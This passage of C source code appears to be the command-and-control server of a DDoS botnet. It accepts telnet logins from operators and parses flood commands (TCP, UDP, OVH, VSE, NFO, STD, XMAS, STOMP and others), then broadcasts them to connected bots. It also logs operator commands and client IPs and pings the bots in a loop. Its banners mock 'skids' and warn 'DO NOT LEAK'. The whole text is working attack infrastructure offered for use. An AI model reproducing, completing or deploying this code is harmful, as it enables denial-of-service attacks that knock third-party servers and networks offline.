                sprintf(repline3,  "\x1b[36m ║ \x1b[96mDONT SPAM OR HIT FEDERAL SITES\x1b[36m          ║ \r\n");
                sprintf(repline4,  "\x1b[36m ║ \x1b[96mDONT GO OVER YOUR TIME\x1b[36m                  ║ \r\n");
                sprintf(repline5,  "\x1b[36m ║ \x1b[96mIF YOU DONT LISTEN YOU WILL BE BANNED\x1b[36m   ║ \r\n");
                sprintf(repline6,  "\x1b[36m  ═════════════════════════════════════════   \r\n");
                
                if(send(thefd, repline1,  strlen(repline1), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, repline2,  strlen(repline2), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, repline3,  strlen(repline3), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, repline4,  strlen(repline4), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, repline5,  strlen(repline5), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, repline6,  strlen(repline6), MSG_NOSIGNAL) == -1) goto end;
                while(1) {
                if(send(thefd, "\x1b[36mDrank$  \x1b[96m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            }


        if(strstr(buf, "!* STOP"))
        {
        sprintf(botnet, "Succesfully Stopped The FLOOD On Tha Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TCP"))
        {  
        sprintf(botnet, "Succesfully Sent A TCP FLOOD\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* UDP"))
        {  
        sprintf(botnet, "Succesfully Sent A UDP FLOOD\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* OVH"))
        {  
        sprintf(botnet, "OVH Flood Sent to Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        if(strstr(buf, "!* VSE"))
        {  
        sprintf(botnet, "VSE Flood Sent to Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* NFO"))
        {  
        sprintf(botnet, "NFO Flood Sent to Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* KILL"))
        {  
        sprintf(botnet, "KILL Flood Sent to Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* STD"))
        {  
        sprintf(botnet, "STD Flood Sent to Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* DROP"))
        {  
        sprintf(botnet, "DROP Flood Sent to Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* XMAS"))
        {  
        sprintf(botnet, "XMAS Flood Sent to Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* STOMP"))
        {  
        sprintf(botnet, "STOMP Flood Sent to Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
    }
        if(strstr(buf, "cls") || strstr(buf, "clear") || strstr(buf, "CLS") || strstr(buf, "C"))
        { 
          if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[36m.  \x1b[96m", 12, MSG_NOSIGNAL) == -1) goto end;
         }
         if (strstr(buf, "!* EXIT")) 
         {
            goto end;
         }
                trim(buf);
                sprintf(botnet, "\x1b[96mDrank$ \x1b[96m");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("monitor.log", "a");
                fprintf(logFile, "%s: \"%s\"\n", accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {       printf("Verified user logged in from: ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("Tracker.log", "a");
                fprintf(logFile, "IP:%d.%d.%d.%d\n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); 
 
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 850)
        {
            printf("Lower The Threads Skid [Recommened By Blazing: 150]\n");
            return 0;
        }
        else if (threads < 850)
        {
            printf("Good Job kid\n");
        }
        printf("\x1b[1;37mPRIVATE SERVER SIDE,\x1b[1;93m DO NOT FUCKING LEAK, \x1b[1;36m Made By ErrorLoading \x1b[1;36m DONT TRY! \x1b[1;94mSCREENED\x1b[0m\n");
        listenFD = create_and_bind(argv[1]); 
        if (listenFD == -1) abort();
 
        s = make_socket_non_blocking (listenFD); 
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); 
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0); 
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL);
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, port);
 
        while(1)
        {
                broadcast("PING", -1, "STRING");
                sleep(60);
        }
  
        close (listenFD);
 
        return EXIT_SUCCESS;
}